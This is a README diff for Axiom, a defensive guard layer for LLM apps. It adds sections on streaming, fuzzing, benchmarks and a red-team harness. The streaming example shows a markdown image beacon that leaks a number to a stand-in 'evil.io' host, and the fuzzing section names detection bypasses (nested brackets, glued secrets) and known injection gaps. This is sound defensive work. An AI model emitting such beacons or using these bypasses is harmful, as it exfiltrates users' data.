@@ -6,6 +6,10 @@
 
 **A deterministic runtime security layer for LLM applications.** Axiom sits between your app and the model and enforces information-flow rules: what context the model may see, what its output may render, and where data may go. It does not try to guess whether a prompt is malicious.
 
+**[Try it in your browser →](https://zoniin.github.io/axiom/)** The playground runs the real engine client-side against all 72 red-team scenarios. You can edit any request or policy and watch a stream get halted before a beacon renders.
+
+[![Axiom playground: a web page's hidden instruction to embed a tracking image is detected, the image is blocked, and the safe output is shown](docs/playground.png)](https://zoniin.github.io/axiom/)
+
 ```text
 $ axiom check examples/request.json --policy examples/policy.yaml
 decision: BLOCK  (14 rules evaluated)
@@ -83,6 +87,29 @@ switch (post.decision) {
 
 A complete runnable version is in [`examples/rag-pipeline.ts`](examples/rag-pipeline.ts) (`npm run example`).
 
+## Streaming
+
+Most apps stream tokens to the user, and an image beacon only has to *render* once to leak. So checking the finished response is too late. `StreamGuard` releases text only once it can no longer change meaning: it holds back the trailing word, anything after an unclosed `[`, `(`, `<` or `![`, and digit runs that could still become a card number. Each released prefix goes through the full engine. If an output rule would escalate or block, the stream halts before the offending text is shown.
+
+```ts
+for await (const text of guardStream(axiom, { tenantId, principal, input, context }, modelTokens)) {
+  res.write(text); // only checked text reaches the client
+}
+```
+
+```text
+token               released     notes
+"Summary"           ""           trailing word may still grow
+" done."            "Summary "
+" !["               "done. "     "![" is held back
+"x](https://evil"   ""
+".io/c?d=123-45"    ""
+"-6789)"            ""
+" thanks"           ■ halted     AX-OUT-001: the image is complete, and none of it was shown
+```
+
+A property-based test checks that for every harness output and any way of chunking it, the streamed text is identical to the non-streamed sanitized output, or the stream halted.
+
 ## Use it as a gateway
 
 ```bash
@@ -132,16 +159,43 @@ Decisions form a lattice, `allow < sanitize < escalate < block`, and a request t
 
 ## Red-team harness
 
-[`harness/scenarios/`](harness/scenarios) has 70 scenarios across direct and indirect injection, rendering exfiltration, sink exfiltration, retrieval authorization, Unicode obfuscation, data leakage and unsupported commitments. Each attack is paired with benign look-alikes, because a guard that blocks everything is useless. CI runs the harness on every push and regenerates [`harness/REPORT.md`](harness/REPORT.md).
+[`harness/scenarios/`](harness/scenarios) has 72 scenarios across direct and indirect injection, rendering exfiltration, sink exfiltration, retrieval authorization, Unicode obfuscation, data leakage and unsupported commitments. Each attack is paired with benign look-alikes, because a guard that blocks everything is useless. CI runs the harness on every push and regenerates [`harness/REPORT.md`](harness/REPORT.md).
 
 | Metric | Result |
 |---|---|
-| Attack scenarios contained | 48 / 48 |
+| Attack scenarios contained | 50 / 50 |
 | Benign scenarios passed through | 19 / 19 |
 | Benign false positives | 0 |
 | Documented known gaps | 3 |
 
 These numbers come from a hand-written corpus checked against deterministic rules, so read them as a regression suite, not a benchmark claim. The known-gap scenarios are kept on purpose: paraphrased injections, non-English injections, and free-text personal data sent to an approved host all get through. See [docs/threat-model.md](docs/threat-model.md) for what Axiom does and doesn't defend against.
+
+## Fuzzing
+
+Hand-written scenarios only cover attacks someone thought of. [`test/properties.test.ts`](test/properties.test.ts) uses [fast-check](https://fast-check.dev) to generate thousands of adversarial outputs from exfiltration-relevant fragments (brackets, tags, schemes, invisible characters, secrets) and checks the invariants in [SECURITY.md](SECURITY.md) on every run:
+
+- sanitized output never contains auto-fetching or executable content
+- redaction is complete: nothing a DLP detector flags survives sanitization
+- sanitization is idempotent
+- a cross-tenant chunk always blocks and never reaches the model
+- tainted context never allows an action
+- audit events never contain sensitive values
+- evaluation is deterministic
+
+The fuzzer has already paid for itself. It found that `![[x]](https://evil)` (nested brackets, valid CommonMark) got past image detection, that the sanitizer's own `[removed]` markers could combine with leftover `![` and `(url)` into a new live image, and that secrets glued to letters (`keyAKIA…`) evaded word-boundary DLP. All three are fixed and pinned by regression tests and harness scenarios. Detection is now conservative, and the sanitizer runs to a fixpoint and finishes with a neutralizing pass, so the first invariant holds by construction rather than by regex coverage.
+
+## Performance
+
+Measured with `npm run bench` on Node 22 in a 4-vCPU cloud container (deterministic rules, no detectors, single thread):
+
+| Scenario | p50 | p99 | Throughput (1 core) |
+|---|---|---|---|
+| Chat turn (input + 300 B output) | 55 µs | 161 µs | 16,075 req/s |
+| RAG turn (10 chunks x 1 KB, 1 KB output) | 657 µs | 1.28 ms | 1,349 req/s |
+| Agent turn (5 chunks, 3 actions) | 177 µs | 488 µs | 5,160 req/s |
+| Adversarial 10 KB output | 1.69 ms | 3.09 ms | 554 req/s |
+
+Native SHA-256 is used for audit digests on Node. A portable implementation keeps the core working in browsers and edge runtimes (`import { Axiom } from 'axiom-guard/core'`).
 
 ## Design principles
 
@@ -162,11 +216,14 @@ src/
   text/              normalization, URL canonicalization, markdown/HTML scanning, DLP detectors
   audit/             hash-chained audit log, JSONL sink, chain verification
   detectors/         optional model-detector adapter with timeout
+  stream.ts          StreamGuard for token-by-token output
+  core.ts            runtime-agnostic entry (browsers, edge); index.ts adds Node file I/O
   server.ts, cli.ts  HTTP gateway and CLI
+playground/          browser playground (deployed to GitHub Pages)
 harness/             policy + YAML scenario corpus + generated report
 policies/            starter and example policies
 schemas/             JSON Schemas generated from the Zod definitions
-test/                unit tests for every rule and utility
+test/                unit tests for every rule, property-based fuzzing, streaming
 ```
 
 ## Docs
